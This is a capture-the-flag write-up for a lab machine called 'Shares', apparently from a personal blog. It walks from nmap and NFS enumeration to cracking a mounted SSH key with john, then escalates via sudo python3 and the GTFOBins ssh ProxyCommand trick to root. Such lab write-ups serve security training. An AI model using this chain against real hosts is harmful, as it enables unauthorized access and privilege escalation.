---
title: "Shares"
date: 2022-09-16T18:33:31+01:00
draft: false
categories:
  - Cyberseclabs
---

## Enumeration

### nmap:

```
PORT STATE SERVICE REASON VERSION
21/tcp open ftp syn-ack vsftpd 3.0.3

80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Pet Shop
| http-methods:
|_ Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)

111/tcp open rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,4 111/tcp6 rpcbind
| 100000 3,4 111/udp6 rpcbind
| 100003 3 2049/udp nfs
| 100003 3 2049/udp6 nfs
| 100003 3,4 2049/tcp nfs
| 100003 3,4 2049/tcp6 nfs
| 100005 1,2,3 33317/tcp6 mountd
| 100005 1,2,3 47026/udp mountd
| 100005 1,2,3 52045/tcp mountd
| 100005 1,2,3 56412/udp6 mountd
| 100021 1,3,4 33401/tcp nlockmgr
| 100021 1,3,4 41275/tcp6 nlockmgr
| 100021 1,3,4 44254/udp nlockmgr
| 100021 1,3,4 60886/udp6 nlockmgr
| 100227 3 2049/tcp nfs_acl
| 100227 3 2049/tcp6 nfs_acl
| 100227 3 2049/udp nfs_acl
|_ 100227 3 2049/udp6 nfs_acl

2049/tcp open nfs_acl syn-ack 3 (RPC #100227)
Service Info: OS: Unix

27853/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyk8rqOZBxSEXCu+mZCgIQOiHcAg/2ivCFVqGH0ehzvIN3eFZ5jll3zDyKehhaSyYeouoQZbpUk4fmTEqPFdUGjOzXhUhf6pQ0atKx3hms+b5ZLaCL2UjburequfIHCfDCbt6Wbj7dozIMmQ4+qjPQqBkUci7DjCTA/LbxNPL47hoC+3vAvCgRxAK6Yq4tUlil3eSgHX9EeJSxJQpDShPjTZ384+DUMx3VJbXFNBtxsUblPeykzrM18Hill3Yy/D4L9ZW0PJ5P3W+cFQuHc3RWLXCY6S1WmHDxGcI2UA3f2UaBDn2zm3cmgt3yKWTuqY98NlSh880AzmAcS6HpDlY/
|   256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDF3clGPfC6R84UaHxAMoGIYn58Njt+Dth8rsl/Aa8W9SXquC3L+TGPb5dVRArkmCgta+moG16PhstNUHlyNVbA=
|   256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGKX5ZbEhRnQU7woPnhhFMtk+c0HJcj0T3xPfAWHTBH9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


36549/tcp open  mountd  syn-ack 1-3 (RPC #100005)

44829/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)

57327/tcp open  mountd  syn-ack 1-3 (RPC #100005)

```

There is a website running, a petshop, and a nfs server.
There is not much information on the website and ftp doesnt allow anonymous login, we can try to enumerate the nfs server.

```
$showmount -e 172.31.1.7

Export list for 172.31.1.7:
/home/amir *.*.*.*
```

Now we know there is a user called amir, and we can try to mount the amir folder on our machine

```
mount -t nfs 172.31.1.7:home/amir /mnt/TempNFS

drwxrwxr-x 5 nair0lf32 docker 4096  2 avril  2020 .
drwxr-xr-x 1 root      root     14 27 oct.  11:41 ..
-rw-r--r-- 1 nair0lf32 docker    0  2 avril  2020 .bash_history
-rw-r--r-- 1 nair0lf32 docker  220  4 avril  2018 .bash_logout
-rw-r--r-- 1 nair0lf32 docker 3786  2 avril  2020 .bashrc
drw-r--r-- 2 nair0lf32 docker 4096  2 avril  2020 .cache
drw-r--r-- 3 nair0lf32 docker 4096  2 avril  2020 .gnupg
-rw-r--r-- 1 nair0lf32 docker  807  4 avril  2018 .profile
drwxrwxr-x 2 nair0lf32 docker 4096  2 avril  2020 .ssh
-rw-r--r-- 1 nair0lf32 docker    0  2 avril  2020 .sudo_as_admin_successful
-rw-r--r-- 1 nair0lf32 docker 7713  2 avril  2020 .viminfo
```

We have access to the .ssh folder with amir's private id_rsa key. We crack that:  
First we use: 

`python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.john` 

to get a john formatted hash file, then we run john on the hash file:

```
john -w=/usr/share/wordlists/rockyou.txt id_rsa.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hello6           (id_rsa)
1g 0:00:00:08 DONE (2021-10-27 11:52) 0.1213g/s 1740Kp/s 1740Kc/s 1740KC/sa6_123..*7¡Vamos!
Session completed


ssh creds:
amir:hello6

```

Now we can ssh as amir using his key...note that ssh is not on port 22

```
ssh amir@172.31.1.7 -i id_rsa -p 27853

amir@shares:/home$ ls
amir  amy
```

There seem to be another user called amy and as amir's folder is empty I guess our user flag is owned by amy.

We check sudo rights for possible lateral movement:

```
$ sudo -l
Matching Defaults entries for amir on shares:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amir may run the following commands on shares:
    (ALL : ALL) ALL
    (amy) NOPASSWD: /usr/bin/pkexec
    (amy) NOPASSWD: /usr/bin/python3
```

And we can. we can run either python or pkexec as amy.
I chose python because I already know how to work with that one. Gotta explore pkexec too later.

```
sudo -u amy /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

And now we are amy. We get User Flag in amy's home folder:  
`cat access.txt`

Now its Privilege Escalation time:

```
amy@shares:/home/amy$ sudo -l
Matching Defaults entries for amy on shares:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amy may run the following commands on shares:
    (ALL) NOPASSWD: /usr/bin/ssh
```

Uh ok amy can run ssh as root? let's ask Gtfobins for help here

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

And Its done, we are root. flag is in the root folder:

` cat system.txt`

And that's it. If you are curious enough remember to try the other way around. and find
other methods to get the flags. by example it seems to be a possible escalation with lxd from amir 'id command' to root.
